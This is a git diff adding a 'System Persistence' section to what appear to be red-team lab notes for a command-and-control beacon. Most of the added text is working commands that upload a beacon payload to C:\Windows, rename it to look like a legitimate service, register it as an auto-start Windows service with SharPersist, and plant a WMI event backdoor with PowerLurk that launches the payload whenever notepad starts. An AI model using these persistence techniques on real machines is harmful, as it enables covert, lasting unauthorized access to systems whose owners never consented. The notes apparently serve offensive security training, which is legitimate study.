@@ -92,4 +92,40 @@ foreach ($Task in $Tasks) {
 3. Do the HKLM/HKCU check above
 4. Add a duplicate entry as above
 
+# System Persistence
+
+Maintain elevated access to a machine without having to exploit a vulnerability again (if patched later). The above methods break a legit service, so can't be used on system services -- instead, we create our own service. SYSTEM processes use P2P or DNS beacons, not HTTP beacons. These methods only work in a high priv beacon.
+
+## Windows Services
+
+On elevated beacon:
+
+```
+cd C:\Windows
+upload C:\Payloads\tcp-local_x64.svc.exe
+mv tcp-local_x64.svc.exe legit-svc.exe
+
+execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
+```
+This makes a new service in a STOPPED state, but with the START_TYPE set to AUTO_START.
+
+## WMI Event Subscriptions
+
+Persistence via WMI events leverages these classes:
+* EventConsumer: the action to perform (e.g. execute a payload)
+* EventFilter: trigger that we can act upon (e.g. process starts, user logs in, USB device is inserted, specific time of day, or when an interval elapses)
+* FilterToConsumerBinding: links an EventConsumer and EventFilter
+
+[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) builds these WMI events, e.g. from a beacon:
+```
+cd C:\Windows
+upload C:\Payloads\dns_x64.exe
+powershell-import C:\Tools\PowerLurk.ps1
+powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+```
+Open notepad on Workstation 2 and the DNS Beacon will appear.
+
+View the classes: ```Get-WmiEvent -Name WmiBackdoor``` 
+
+Backdoors can be removed by ```Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject```.
 
